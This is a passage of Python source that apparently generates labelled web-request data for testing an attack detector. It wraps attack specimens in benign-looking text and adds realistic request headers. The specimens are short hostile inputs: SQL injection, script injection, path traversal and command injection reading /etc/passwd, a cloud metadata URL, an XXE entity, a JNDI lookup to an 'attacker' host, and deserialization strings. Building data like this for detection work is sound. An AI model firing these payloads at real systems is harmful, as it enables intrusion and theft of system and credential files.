    "is {x} still exploitable on modern frameworks?",
    "our SAST tool keeps reporting {x} as a false positive",
    "the bug bounty triager closed {x} as informational",
    "does the 2026 CRS ruleset cover {x} out of the box?",
    "training slide 12 uses {x} as the worked example",
]
AMBIGUOUS_FRAMES_VERBATIM = [
    "{x}", "re: {x}", "note: {x}", "search: {x}", "\"{x}\"", "fyi {x}",
    "q: {x}", "test {x}", "example: {x}", "-> {x}", "[{x}]", "{x} ?",
]
AMBIGUOUS_FRAMES = AMBIGUOUS_FRAMES_DISCUSSION + AMBIGUOUS_FRAMES_VERBATIM
_N_DISCUSSION = len(AMBIGUOUS_FRAMES_DISCUSSION)

# Short, recognisable attack-syntax specimens quoted inside the frames above.
# Covers all fourteen families, so the error floor is measured across the whole
# taxonomy rather than only the families that existed in v2.1.
AMBIGUOUS_SPECIMENS = [
    "' OR 1=1--", "admin'--", "' UNION ALL SELECT password FROM users--",
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "javascript:alert(document.domain)", "../../etc/passwd",
    "..\\..\\windows\\win.ini", "{{7*7}}", "${7*7}", "; cat /etc/passwd",
    "| whoami", "$(id)", "$ne", "{\"$gt\": \"\"}", "*)(uid=*)",
    "http://169.254.169.254/latest/meta-data/", "%0d%0aSet-Cookie: x=1",
    "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>", "${HOME}",
    "${jndi:ldap://attacker/a}", "__proto__[isAdmin]=true",
    "{\"__proto__\":{\"role\":\"admin\"}}", "O:8:\"stdClass\":1:{s:4:\"user\";}",
    "!!python/object/apply:os.system", "Transfer-Encoding: chunked",
]

# Enumerated (frame, specimen) cores, in fixed order.
AMBIGUOUS_CORES = [
    (fi, si) for fi in range(len(AMBIGUOUS_FRAMES))
    for si in range(len(AMBIGUOUS_SPECIMENS))
]


def ambiguous_value(rng: random.Random, idx=None):
    """Return (text, core_id): benign-in-context text with literal attack syntax.

    The id is prefixed `ambigV`/`ambigD` so the verbatim (irreducible) and
    discussion (headroom) kinds can be told apart from the shipped `group`
    column with no extra schema.
    """
    fi, si = AMBIGUOUS_CORES[idx] if idx is not None else rng.choice(AMBIGUOUS_CORES)
    text = AMBIGUOUS_FRAMES[fi].format(x=AMBIGUOUS_SPECIMENS[si])
    kind = "D" if fi < _N_DISCUSSION else "V"
    return text, f"ambig{kind}-{fi:02d}-{si:02d}"


# --------------------------------------------------------- request headers --
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "curl/8.4.0",
    "python-requests/2.31.0",
    "PostmanRuntime/7.36.1",
    "Mozilla/5.0 (compatible; ShopBot/2.1; +https://example.com/bot)",
    "okhttp/4.12.0",
]

CONTENT_TYPES = {
    "form": "application/x-www-form-urlencoded",
    "json": "application/json",
    "graphql": "application/json",
    "multipart": "multipart/form-data; boundary=----WebKitFormBoundary{b}",
    "query": None,
}


def referer(rng, base, tier):
    page = rng.choice(["/", "/products", "/search?q=juice&page=2", "/account",
                       "/checkout?step=1"])
    if tier != "routine" and rng.random() < 0.4:
        page = rng.choice([
            f"/search?q={urllib.parse.quote_plus(procedural_query(rng))}",
            "/products?sort=price&dir=desc&filter=organic%2Cfresh",
            f"/orders/{_digits(rng, 6)}?tab=invoice&print=1",
        ])
    return base + page


def cookie(rng, tier, sid=None):
    sid = sid or "".join(rng.choices(string.ascii_lowercase + string.digits, k=26))
    parts = [f"PHPSESSID={sid}", f"lang={rng.choice(LANGS)}"]
    if tier != "routine" and rng.random() < 0.5:
        # Hoisted out of the f-string: a backslash in an expression part is a
        # SyntaxError before 3.12 (PEP 701), and we support 3.10+.
        prefs = urllib.parse.quote_plus('{"theme":"dark","n":2}')
        parts.append(f"prefs={prefs}")
    if rng.random() < 0.3:
        parts.append(f"cart={rng.randint(1, 9)}")
    return "; ".join(parts)


def extra_headers(rng, tier):
    """Forwarding / transport headers a real proxy chain adds.

    These exist on the benign side *specifically* so that the header-injection
    and request-smuggling families cannot be detected by header name alone: a
    `X-Forwarded-Host` or `Transfer-Encoding` is ordinary, an injected newline
    before one is not.
    """
    h = {}
    if rng.random() < (0.45 if tier != "routine" else 0.2):
        h["X-Forwarded-For"] = ", ".join(
            f"{rng.randint(10, 203)}.{rng.randint(0, 254)}."
            f"{rng.randint(0, 254)}.{rng.randint(1, 254)}"
            for _ in range(rng.randint(1, 3)))
    if rng.random() < (0.35 if tier != "routine" else 0.15):
        h["Origin"] = f"https://{rng.choice(BENIGN_HOSTS)}"
    if rng.random() < 0.12:
        h["X-Forwarded-Host"] = rng.choice(BENIGN_HOSTS)
    if rng.random() < 0.08:
        h["Transfer-Encoding"] = "chunked"
    return h


if __name__ == "__main__":
    import collections
    print(f"benign cores: {len(BENIGN_CORES)}",
          dict(collections.Counter(BENIGN_CORE_KINDS)))
    print(f"ambiguous cores: {len(AMBIGUOUS_CORES)} "
          f"({len(AMBIGUOUS_FRAMES)} frames x {len(AMBIGUOUS_SPECIMENS)} specimens)")
    bad = [c for c in BENIGN_CORES if is_injective(c)]
    print("cores tripping the injection guard:", len(bad))
